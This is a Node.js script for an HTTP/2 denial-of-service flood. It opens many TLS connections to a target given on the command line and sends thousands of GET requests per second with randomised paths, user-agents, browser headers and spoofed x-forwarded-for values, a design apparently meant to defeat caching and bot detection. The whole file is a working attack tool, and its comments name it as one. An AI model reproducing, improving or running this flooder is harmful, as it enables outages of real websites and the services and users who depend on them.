const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const UserAgent = require('user-agents');

// Command-line arguments parsing
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 260,
    Rate: parseInt(process.argv[4]) || 1000,
    threads: parseInt(process.argv[5]) || 10
};

// Header arrays for randomization
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

const lang_header = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.9',
    'es-ES,es;q=0.8',
    'it-IT,it;q=0.7',
    'ja-JP,ja;q=0.9'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br',
    'gzip',
    'deflate'
];

const control_header = [
    'no-cache',
    'max-age=0',
    'no-store',
    'must-revalidate',
    'private'
];

const dest_header = [
    'document',
    'image',
    'style',
    'script',
    'font'
];

const site_header = [
    'same-origin',
    'cross-site',
    'same-site',
    'none'
];

const cplist = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
    'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384'
];

// Utility functions
function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function generateRandomPath() {
    const paths = [
        '/', '/home', '/about', '/contact', '/products', '/services',
        '/blog', '/news', '/shop', '/cart', '/profile', '/search'
    ];
    const randomPath = randomElement(paths);
    return randomPath + generateQueryParams();
}

function generateQueryParams() {
    const params = [
        'q', 's', 'search', 'id', 'page', 'category', 'sort', 'filter',
        'lang', 'region', 'type', 'query', 'token', 'session'
    ];
    const count = Math.floor(Math.random() * 5) + 1;
    let query = '?';
    for (let i = 0; i < count; i++) {
        const key = randomElement(params);
        const value = crypto.randomBytes(8).toString('hex');
        query += `${key}=${value}${i < count - 1 ? '&' : ''}`;
    }
    return query;
}

function generateRandomString(length) {
    return crypto.randomBytes(length).toString('hex').slice(0, length);
}

// Validate target URL
const parsedTarget = url.parse(args.target);
if (!parsedTarget.host) {
    console.error('Invalid target URL');
    process.exit(1);
}

// TLS options
const tlsOptions = {
    socket: null,
    ciphers: randomElement(cplist),
    ecdhCurve: 'auto',
    host: parsedTarget.host,
    servername: parsedTarget.host,
    rejectUnauthorized: false,
    secureOptions: crypto.constants.SSL_OP_NO_TICKET | 
                  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
    ALPNProtocols: ['h2', 'http/1.1']
};

// Connection pool management
class ConnectionPool {
    constructor(size) {
        this.pool = new Array(size).fill(null);
        this.activeConnections = 0;
        this.maxConnections = size;
    }

    createConnection() {
        if (this.activeConnections >= this.maxConnections) return null;

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.on('error', () => {
            tlsConn.destroy();
            this.activeConnections--;
        });

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 20000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            }
        });

        this.activeConnections++;
        return client;
    }

    destroyConnection(client) {
        if (client) {
            client.destroy();
            this.activeConnections--;
        }
    }
}

// Request generator
class RequestGenerator {
    constructor(client) {
        this.client = client;
    }

    generateHeaders() {
        const userAgent = new UserAgent();
        return {
            ':method': 'GET',
            ':authority': parsedTarget.host,
            ':scheme': 'https',
            ':path': generateRandomPath(),
            'user-agent': userAgent.toString(),
            'accept': randomElement(accept_header),
            'accept-language': randomElement(lang_header),
            'accept-encoding': randomElement(encoding_header),
            'cache-control': randomElement(control_header),
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': randomElement(dest_header),
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': randomElement(site_header),
            'sec-fetch-user': '?1',
            'sec-ch-ua': `"${userAgent.brand}";v="${userAgent.version.split('.')[0]}", "Chromium";v="${userAgent.version.split('.')[0]}", "Not A(Brand";v="99"`,
            'sec-ch-ua-mobile': userAgent.mobile ? '?1' : '?0',
            'sec-ch-ua-platform': `"${userAgent.platform}"`,
            'referer': `https://${parsedTarget.host}${generateRandomPath()}`,
            'x-forwarded-for': generateRandomString(12),
            'x-requested-with': 'XMLHttpRequest',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'te': 'trailers',
            'dnt': Math.random() > 0.5 ? '1' : '0',
            'x-correlation-id': crypto.randomUUID()
        };
    }

    sendRequests(rate) {
        for (let i = 0; i < rate; i++) {
            const request = this.client.request(this.generateHeaders());
            request.on('response', () => {});
            request.on('error', () => {});
            request.end();
        }
    }
}

// Main attack function
function startAttack() {
    const pool = new ConnectionPool(args.threads);

    for (let i = 0; i < args.threads; i++) {
        const client = pool.createConnection();
        if (!client) continue;

        client.on('connect', () => {
            const generator = new RequestGenerator(client);
            const interval = setInterval(() => {
                try {
                    generator.sendRequests(args.Rate);
                } catch (err) {
                    console.error('Request error:', err.message);
                }
            }, 1000);

            const onClose = () => {
                clearInterval(interval);
                pool.destroyConnection(client);
            };

            client.on('close', onClose);
            client.on('error', onClose);
        });

        client.on('error', () => {
            pool.destroyConnection(client);
        });
    }
}

// Start the attack
for (let i = 0; i < args.threads; i++) {
    setImmediate(startAttack);
}

// Timeout to end the attack
setTimeout(() => {
    console.log('Attack finished.');
    process.exit(0);
}, args.time * 1000);

// Performance monitoring
let requestCount = 0;
setInterval(() => {
    console.log(`Requests sent: ${requestCount}`);
}, 10000);

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err.message);
});
